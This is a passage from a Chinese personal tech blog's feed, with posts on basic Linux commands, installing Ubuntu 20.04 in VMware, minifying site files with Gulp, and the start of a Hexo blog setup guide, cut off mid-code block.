移动或重命名文件命令"></a>mv 移动或重命名文件命令</h2><p>格式：mv [选项] &lt;源文件或目录&gt; &lt;目的文件或目录&gt;</p><p>该命令用于对一个文件或目录进行重命名或将几个文件移到另一目录。主要选项如下：</p><p>-f：强制移动,若目标目录下有同名的文件则覆盖它。</p><p>例如：执行命令<code>mv test.c program.c</code>，则将当前目录下的test.c文件重命名为program.c。</p><h1 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h1><p>为了减小传输文件的大小，一般都开启压缩。linux下常见的压缩文件有tar、bzip2、zip、rar等，7z这种用的相对较少。</p><p><strong>.tar</strong> 使用tar命令压缩或解压</p><p><strong>.bz2</strong> 使用bzip2命令操作</p><p><strong>.gz</strong> 使用gzip命令操作</p><p><strong>.zip</strong> 使用unzip命令解压</p><p><strong>.rar</strong> 使用unrar命令解压</p><p>最常用的就是<code>.tar.gz</code>文件格式了。其实是经过了tar打包后，再使用gzip压缩。</p><p>创建压缩文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf test.tar.gz ./</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure><h1 id="vi-vim编辑器的简单使用"><a href="#vi-vim编辑器的简单使用" class="headerlink" title="vi/vim编辑器的简单使用"></a>vi/vim编辑器的简单使用</h1><p>Vi (visual interface) 是Linux上主要的文本编辑软件。它可以进行文本输入、删除、查找、替换、块操作等诸多文本操作。但是目前我们使用比较多的是 vim 编辑器（vi的增强版）。vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。基本操作如下图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/RGqJFMW1HsA5L76.png" alt="image-20210208112035571"></p><h1 id="gcc-编译器的简单使用"><a href="#gcc-编译器的简单使用" class="headerlink" title="gcc 编译器的简单使用"></a>gcc 编译器的简单使用</h1><p>Linux 下最常用的C 语言编译器是 gcc (GNU Compiler Collection)。</p><p>编译过程：</p><p>（1）预处理</p><p>（2）编译</p><p>（3）汇编</p><p>（4）链接</p><p>源文件 test.c 生成可执行文件 test 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>如果未指定文件名，默认生成可执行文件 <code>a.out</code> </p><h1 id="apt-命令与-yum-命令"><a href="#apt-命令与-yum-命令" class="headerlink" title="apt 命令与 yum 命令"></a>apt 命令与 yum 命令</h1><blockquote><p>apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。</p><p>apt 命令执行需要超级管理员权限(root)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su root <span class="comment">#su命令用于切换用户</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="apt-语法"><a href="#apt-语法" class="headerlink" title="apt 语法"></a>apt 语法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt [options] [<span class="built_in">command</span>] [package ...]</span><br></pre></td></tr></table></figure><ul><li><strong>options：</strong>可选，选项包括 -h（帮助），-y（当安装过程提示选择全部为”yes”），-q（不显示安装的过程）等等。</li><li><strong>command：</strong>要进行的操作。</li><li><strong>package</strong>：安装的包名。</li></ul><h2 id="apt-常用命令"><a href="#apt-常用命令" class="headerlink" title="apt 常用命令"></a>apt 常用命令</h2><ul><li><p>列出所有可更新的软件清单命令：<strong>sudo apt update</strong></p></li><li><p>升级软件包：<strong>sudo apt upgrade</strong></p></li><li><p>安装指定的软件命令：<strong>sudo apt install <package_name></strong></p><p>安装多个软件包：<strong>sudo apt install <package_1> <package_2> <package_3></strong></p></li><li><p>更新指定的软件命令：<strong>sudo apt update <package_name></strong></p></li><li><p>显示软件包具体信息,例如：版本号，安装大小，依赖关系等等：<strong>sudo apt show <package_name></strong></p></li><li><p>删除软件包命令：<strong>sudo apt remove <package_name></strong></p></li><li><p>清理不再使用的依赖和库文件: <strong>sudo apt autoremove</strong></p></li><li><p>移除软件包及配置文件: <strong>sudo apt purge <package_name></strong></p></li><li><p>列出所有已安装的包：<strong>apt list –installed</strong></p></li><li><p>列出所有已安装的包的版本信息：<strong>apt list –all-versions</strong></p></li></ul><blockquote><p>yum（ Yellow dog Updater, Modified）是一个在 Fedora、CentOS和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。</p><p>基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</p></blockquote><h2 id="yum-语法"><a href="#yum-语法" class="headerlink" title="yum 语法"></a>yum 语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum [options] [command] [package ...]</span><br></pre></td></tr></table></figure><ul><li><strong>options：</strong>可选，选项包括-h（帮助），-y（当安装过程提示选择全部为 “yes”），-q（不显示安装的过程）等等。</li><li><strong>command：</strong>要进行的操作。</li><li><strong>package：</strong>安装的包名。</li></ul><h2 id="yum-常用命令"><a href="#yum-常用命令" class="headerlink" title="yum 常用命令"></a>yum 常用命令</h2><ul><li>列出所有可更新的软件清单命令：<strong>yum check-update</strong></li><li>更新所有软件命令：<strong>yum update</strong></li><li>仅安装指定的软件命令：<strong>yum install <package_name></strong></li><li>仅更新指定的软件命令：<strong>yum update <package_name></strong></li><li>删除软件包命令：<strong>yum remove <package_name></strong></li><li>清除缓存命令： <strong>yum clean all</strong> </li></ul><h1 id="服务相关命令"><a href="#服务相关命令" class="headerlink" title="服务相关命令"></a>服务相关命令</h1><ul><li><code>systemctl start apache2</code> (<code>service apache2 start</code>) 启动apache服务</li><li><code>systemctl stop apache2</code>(<code>service apache2 stop</code>) 停止apache服务</li><li><code>systemctl restart apache2</code> (<code>service apache2 restart</code>) 重启apache服务</li><li><code>systemctl status apache2</code> (<code>service apache2 status</code>) 查看apache运行状态</li><li><code>systemctl enable apache2.service   </code> 设为开机自动运行服务</li><li><code>systemctl disable apache2.service      </code> 取消开机自动运行服务</li></ul><h1 id="查看系统状态命令"><a href="#查看系统状态命令" class="headerlink" title="查看系统状态命令"></a>查看系统状态命令</h1><p>登陆一台linux机器，有些命令能够帮助你快速找到问题。这些命令涵盖内存、cpu、网络、io、磁盘等。</p><ul><li><code>uname</code>命令可以输出当前的内核信息，让你了解到用的是什么机器。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux linux 5.4.0-58-generic <span class="comment">#64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><ul><li><code>ps</code>命令能够看到进程/线程状态。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到java进程</span></span><br><span class="line">ps -ef|grep java</span><br></pre></td></tr></table></figure><ul><li><code>top</code>系统状态一览，主要查看cpu load负载、cpu占用率，使用内存或者cpu最高的一些进程。</li><li><code>df</code>命令用来查看系统中磁盘的使用量，用来查看磁盘是否已经到达上限。<code>df -h</code>可以以友好的方式进行展示。</li><li><code>ifconfig</code> 查看ip地址</li><li><code>ping</code> 检测网络连接</li><li><code>netstat</code>虽然<code>ss</code>命令可以替代<code>netstat</code>了，但现实中netstat仍然用的更广泛一些。比如，查看当前的所有tcp连接。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找本地端口相关</span></span><br><span class="line">netstat -ant </span><br></pre></td></tr></table></figure><hr><p>待补充。。。</p><blockquote><p>参考资料：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MDEwNzAzNg==&mid=2649451542&idx=1&sn=d49f71ee4d00fda3e366dc9ad1a40028&chksm=f3a24d65c4d5c473073259d0902bca1fff65c2ee94116643bb2f3764dc3f789396760d99ce09&mpshare=1&scene=23&srcid=0119KZZGVA1O4x64iOgBcCQG&sharer_sharetime=1613318033634&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">看完这篇你一定能掌握Linux（非广告）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu20.04安装记录</title>
      <link href="posts/2811.html"/>
      <url>posts/2811.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从手机，到服务器上广泛使用的<code>centos</code>，到漂亮的桌面发行版<code>ubuntu</code>，甚至是风靡全球的<code>树莓派</code>，到处都是linux的身影。Linux系统的发行版本众多，如基于社区开发的debian、archlinux，和基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux等。这里选择基于debian发行版和gnome桌面环境的Ubuntu 进行安装体验。</p><h1 id="安装VMware虚拟机"><a href="#安装VMware虚拟机" class="headerlink" title="安装VMware虚拟机"></a>安装VMware虚拟机</h1><p>排除掉实体机和双系统的运行方式，这里选择在虚拟机上运行Linux系统。</p><p>前往 <a href="https://www.vmware.com/">官网</a> 下载Vmware虚拟机软件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DzHwdn3cAE85r14.png" alt="image-20201115160332451"></p><p>选择VMware Workstation Pro 16.0 for Windows下载（当前最新版）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/uKN3eWxZvnDcHFE.png" alt="image-20201115233840538"></p><p>下载好后选择位置默认安装即可。</p><h1 id="安装Ubuntu系统"><a href="#安装Ubuntu系统" class="headerlink" title="安装Ubuntu系统"></a>安装Ubuntu系统</h1><h2 id="下载镜像文件"><a href="#下载镜像文件" class="headerlink" title="下载镜像文件"></a>下载镜像文件</h2><p>版本选择：ubuntu 20.04.1 LTS  <a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a></p><p>下载速度慢的话可以在中科大源下载  <a href="http://mirrors.ustc.edu.cn/">http://mirrors.ustc.edu.cn/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LtSJsK5iMAx7pwB.png" alt="image-20201115155320583"></p><h2 id="创建Ubuntu虚拟机"><a href="#创建Ubuntu虚拟机" class="headerlink" title="创建Ubuntu虚拟机"></a>创建Ubuntu虚拟机</h2><p>打开vmware，选择创建新的虚拟机</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sAEG7QtKn1VpFPu.png"></p><p>选择自定义</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9AQZcTNPCKwLIyj.png"></p><p>选择稍后安装操作系统</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/XkqDy5OlRbdjFsC.png" alt="image-20201116000036529"></p><p>选择Linux，ubuntu 64位</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/l6ijyQ9JOaZbn5m.png" alt="image-20210214233038803"></p><p>根据电脑配置选择处理器数量，这里主机是八核处理器，数量选择如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/EnyZA9Hztg1dkav.png" alt="image-20201116000356510"></p><p>选择内存大小</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/u8zUF9r3mcEikew.png" alt="image-20201116000607760"></p><p>网络类型，I/O控制器类型，磁盘类型，磁盘选择默认即可</p><p>磁盘大小选择</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aY6USWJkV2FMd1K.png" alt="image-20201116000919973"></p><p>指定磁盘文件默认即可</p><p>选择自定义硬件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ICp4WovQNLgwfhJ.png" alt="image-20201116001105197"></p><p>完成下列操作后关闭</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nImLyf2QxO8whrY.png" alt="image-20201116001519587"></p><h2 id="开启Ubuntu"><a href="#开启Ubuntu" class="headerlink" title="开启Ubuntu"></a>开启Ubuntu</h2><p>开启此虚拟机</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wD5JBGOqYdAozV7.png" alt="image-20201116001750169"></p><p>稍作等待至Install</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/49SrsLCKF2oDJWc.png" alt="image-20201116002343400"></p><p>continue</p><p>Install Now</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U8YJpZNzCwnq6ht.png" alt="image-20201116002715987"></p><p>continue</p><p>选择地区</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wOvuteENrPfJndX.png" alt="image-20201116002811568"></p><p>设置用户名和密码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Si7dgGltbWzqDrK.png" alt="image-20201116002948041"></p><p>等待系统相关配置</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NsE1MP8TKf3ilLC.png" alt="image-20201116003202060"></p><p>restart重启</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/biNThdJmnZR7u8L.png" alt="image-20201116003825147"></p><p>使用刚才创建的账户登录</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/QDU7ByJXNYEMCKz.png" alt="image-20201116004426112"></p><p>Skip</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LVQ12ilHdPXMEqp.png" alt="image-20201116004531824"></p><p>Next…</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/6WrVKNH9IcumfXQ.png" alt="image-20201116004603633"></p><p>到此可以看到Ubuntu桌面了</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PU12Ew3kDmZs85H.png" alt="image-20201116004750134"></p><h2 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h2><blockquote><p>VMware Tools作用:</p><p>可以在本机和虚拟机之间拖拽文件</p><p>使虚拟机的屏幕充满VMware Workstation的窗口</p></blockquote><p>1、选择“虚拟机” -&gt; “安装VMware Tools”，这里已经安装过了，所以显示灰色</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/UIajiyv9pGWwcDV.png" alt="image-20210215015014854"></p><p>2、点击后可以在桌面看到一个压缩包，打开终端把压缩包解压到某个路径。</p><p>3、解压完之后，进入解压路径，就会看VMware Tools的安装包。</p><p>4、进入安装包，打开终端，执行安装程序。</p><p>5、开始安装之后见到yes，就输入yes。其他的就一路回车按（Enter）直到出现“Enjoy, –the VMware team”就表示安装成功了，然后手动重启虚拟机，虚拟机的屏幕就充满VMware Workstations的窗口了。</p><p>详情可见这篇<a href="https://blog.csdn.net/engerla/article/details/83009677">文章</a></p><h2 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h2><p>用默认的镜像源可能会导致下载速度过慢，有必要更换国内的镜像源。</p><p>进入软件 Software &amp; Updates 进行更换</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ea3suvftd8kbRP5.png" alt="image-20210215020614139">  </p><p>在 Download from 一栏中选择Others，找到 China，选择国内的镜像源，这里选择阿里云。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fwx8IG4c9DQqa2b.png" alt="image-20210215020740306"></p><p>选好后输入密码，点击 Close，千万别点 Revert</p><p>到此更换完成。</p><blockquote><p>基本配置弄好后，就可以尽情享用 Ubuntu ！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gulp压缩初体验</title>
      <link href="posts/175.html"/>
      <url>posts/175.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p><a href="http://gulpjs.com/">Gulp</a>  是一个自动化构建工具，开发者可以使用它在项目开发过程中自动执行常见任务。</p></blockquote><ul><li>搭建web服务器</li><li>文件保存时自动重载浏览器</li><li>使用预处理器如Sass、LESS</li><li>优化资源，比如压缩CSS、JavaScript、压缩图片</li></ul><p>当然Gulp能做的远不止这些。这里也只是简单利用它来压缩html,css,js文件，一定程度上减缓站点加载过慢的问题。</p><h1 id="Gulp的安装"><a href="#Gulp的安装" class="headerlink" title="Gulp的安装"></a>Gulp的安装</h1><p>首先确保已经正确安装了node.js环境，然后以全局方式安装gulp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g gulp</span><br></pre></td></tr></table></figure><p>全局安装gulp后，还需要在每个要使用gulp的项目中都单独安装一次。把目录切换到你的项目文件夹中，然后在命令行中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev gulp  // --save-dev用于把gulp写进项目package.json文件的依赖中</span><br></pre></td></tr></table></figure><h1 id="Gulp的使用"><a href="#Gulp的使用" class="headerlink" title="Gulp的使用"></a>Gulp的使用</h1><h2 id="建立gulpfile-js文件"><a href="#建立gulpfile-js文件" class="headerlink" title="建立gulpfile.js文件"></a>建立gulpfile.js文件</h2><p>在项目根目录下新建一个文件名为<code>gulpfile.js</code>的文件，之后要做的事情就是在<code>gulpfile.js</code>文件中定义我们的任务了。下面是这次的 <code>gulpfile.js</code> 文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-uglify&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> minifyCSS = <span class="built_in">require</span>(<span class="string">&#x27;gulp-minify-css&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlminify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-html-minify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩js</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-js&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.js&#x27;</span>) </span><br><span class="line"> .pipe(uglify())</span><br><span class="line"> .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>)) </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩css</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-css&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.css&#x27;</span>)</span><br><span class="line"> .pipe(minifyCSS())</span><br><span class="line"> .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩html</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./*.html&#x27;</span>)</span><br><span class="line">    .pipe(htmlminify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>API</p><ul><li>gulp.task(‘name’, function(){})    定义任务</li><li>gulp.src(‘path’)    从该路径读取要被压缩的文件</li><li>gulp.dest(‘path’)    把压缩后的文件写入该路径</li></ul><h2 id="安装gulp插件"><a href="#安装gulp插件" class="headerlink" title="安装gulp插件"></a>安装gulp插件</h2><p>这里需要安装</p><ul><li>gulp-uglify  用于压缩js文件大小</li><li>gulp-minify-css  用于压缩css文件大小</li><li>gulp-html-minify  用于压缩html文件大小</li></ul><h2 id="运行gulp任务"><a href="#运行gulp任务" class="headerlink" title="运行gulp任务"></a>运行gulp任务</h2><p>插件安装完成后,使用 <code>gulp</code> 后面可以加上要执行的任务名，例如<code>gulp task1</code>，如果没有指定任务名，则会执行任务名为<code>default</code>的默认任务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp task_name</span><br></pre></td></tr></table></figure><h1 id="Gulp使用前后"><a href="#Gulp使用前后" class="headerlink" title="Gulp使用前后"></a>Gulp使用前后</h1><p>压缩前</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/RXSA3Ob6CdPxvn1.png" alt="image-20210131230716274"></p><p>压缩中</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/EMfnGihjT3N19z6.png" alt="image-20210131231014617"></p><p>压缩后</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Aw4k1GNKv2n67Zh.png" alt="image-20210131231059152"></p><p>这里初次窥见了gulp的强大~~</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote><p>gulp的功能还有很多，也十分便捷高效。此番小试牛刀，更待日后探索。。。</p><p>最后，附上Butterfly主题作者关于Gulp压缩的教程，一个 <code>gulp </code> 命令轻松完成文件压缩！</p><p><a href="https://butterfly.js.org/posts/4073eda/#Gulp%E5%A3%93%E7%B8%AE">https://butterfly.js.org/posts/4073eda/#Gulp%E5%A3%93%E7%B8%AE</a></p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.jianshu.com/p/a9e7838c8043">gulp 及其常用插件</a></p><p>[2] <a href="https://www.cnblogs.com/2050/p/4198792.html">前端构建工具gulpjs的使用介绍及技巧</a></p><p>[3] <a href="https://blog.csdn.net/weixin_33929309/article/details/86069162?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">Gulp新手入门教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gulp </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客搭建记录 Hexo+Butterfly+Github Page+Coding</title>
      <link href="posts/50074.html"/>
      <url>posts/50074.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实我一直有搭建博客的想法，但直到今天才开通了这个博客，还是利用上假期的闲工夫。在大佬们博文的帮助下，小站初具模样，这里对他们致以万分感谢。下面就搭建过程进行简单记录。</p><h1 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><a href="https://hexo.io/zh-cn/">Hexo</a> 是一款基于 Node.js 用于快速搭建博客的框架，有了它就可以完成完成个人博客的构建，它会帮你构建博客的整个框架，你只需要会使用Markdown 写博客即可。关于Hexo的具体介绍，可以在其官方网站查看具体的说明。</li><li><a href="https://butterfly.js.org/">Butterfly</a> 博客主题。A Simple and Card UI Design theme for Hexo.</li><li><a href="https://help.github.com/en/articles/what-is-github-pages">Github Page</a> 是 Github 提供的静态网站托管服务，可从 Github 仓库中展示你的个人、组织或者项目的静态网页。你可以选择使用 Github Pages 免费提供的域名 github.io 或者自己购买域名来发布站点，站点可以被免费托管在 Github 上。使用Github Pages可以为你提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。</li><li><a href="https://coding.net/">Codiing</a> 是一站式软件研发管理协作平台，提供 Git/SVN 代码托管、项目协同、测试管理等工具，将博客托管在coding上，可提高国内访问博客的速度。</li><li><a href="https://git-scm.com/">Git</a> 是目前世界上最先进的分布式版本控制系统（没有之一）。这里我们使用git bash 完成安装，初始化，上传等操作。</li><li><a href="https://nodejs.org/zh-cn/">node.js</a> 是一个基于Chrome V8引擎的JavaScript运行环境。安装好node.js后利用npm包管理工具来安装Hexo</li></ul><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>在windows10系统下，前往<a href="https://git-scm.com/">Git</a>官网下载，安装。其他系统下的Git安装方法可在<a href="https://hexo.io/zh-cn/docs/">hexo的文档</a>中查阅。</p><p>安装正确的话，在桌面或文件夹空白处鼠标右键菜单会新增“Git GUI Here”和“Git Bash Here”两个选项。</p><p>Git 常用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone -b &lt;branch&gt; https://github.com/xxxx/xxxx.git</span><br><span class="line">git pull</span><br><span class="line">git add .</span><br><span class="line">git commit -m &#x27;comment&#x27;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><p>前往<a href="https://nodejs.org/zh-cn/">node.js官网</a> 选择长期支持版本的node.js下载，默认路径安装即可。</p><p>在cmd中输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --version</span><br></pre></td></tr></table></figure><p>出现版本信息则表示安装成功。</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>完成前两个应用的安装后，即可使用npm安装Hexo</p><p>在桌面空白处单击右键，打开git bash，输入Hexo安装命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>因为npm是从国外服务器下载，可能出现异常，速度慢等问题，所以有更好的选择</p><p><strong><a href="https://developer.aliyun.com/mirror/NPM?from=tnpm">淘宝NPM镜像</a></strong></p><p>这是一个完整 <code>npmjs.org</code> 镜像，你可以用此代替官方版本(只读)，同步频率目前为 <strong>10分钟</strong> 一次以保证尽量与官方服务同步。</p><p>其安装命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>之后可以使用其定制的 <a href="https://github.com/cnpm/cnpm">cnpm</a> (gzip 压缩支持) 命令行工具代替默认的 <code>npm</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>下载速度快了不少有没有</p><p>检查Hexo是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>出现版本信息则表示安装成功。</p><p>安装好以后，可以使用以下两种方式执行 Hexo：</p><ol><li><code>npx hexo &lt;command&gt;</code></li><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code></li></ol><h1 id="搭建工作"><a href="#搭建工作" class="headerlink" title="搭建工作"></a>搭建工作</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>这里在E盘下新建一个目录<code> Blog</code>,用来存放相关文件。在此处打开 <code>Git Bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><blockquote><p>注意：若没有把Hexo添加到环境变量，在所有命令中的 <code>hexo</code> 前都要加上 <code>npx</code></p></blockquote><p>命令执行完成后，将在E:\Blog\下生成相应的文件，目录如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/FAnR3pHMTsYbeaL.png" alt="image-20210130221733932"></p><p>主要关注的是：</p><ul><li>_config.yml , 配置文件，在此配置大部分参数</li><li>source/_posts , 存放md文件</li><li>themes , 主题文件夹</li></ul><h2 id="生成静态页面-本地"><a href="#生成静态页面-本地" class="headerlink" title="生成静态页面(本地)"></a>生成静态页面(本地)</h2><p>可通过以下命令生成静态页面:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 